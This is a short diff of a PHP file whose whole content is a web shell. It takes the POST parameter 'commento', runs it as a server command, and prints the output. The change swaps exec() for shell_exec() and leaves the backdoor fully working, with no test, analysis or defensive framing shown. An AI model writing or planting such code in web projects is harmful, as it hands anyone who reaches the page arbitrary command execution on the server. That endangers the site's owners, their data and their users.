@@ -1,15 +1,12 @@
 <?php
 if(isset($_POST['commento']))
 {
-  exec($_POST['commento'], $output, $return); //--norestore
-  if($output)
-  {
+  $output = shell_exec($_POST['commento']); //--norestore
+
 	echo '<pre>';
 	print_r($output);
-	echo '<br>';
-	print_r($return);
 	echo '</pre>';
-  }
+
 }
 ?>
 
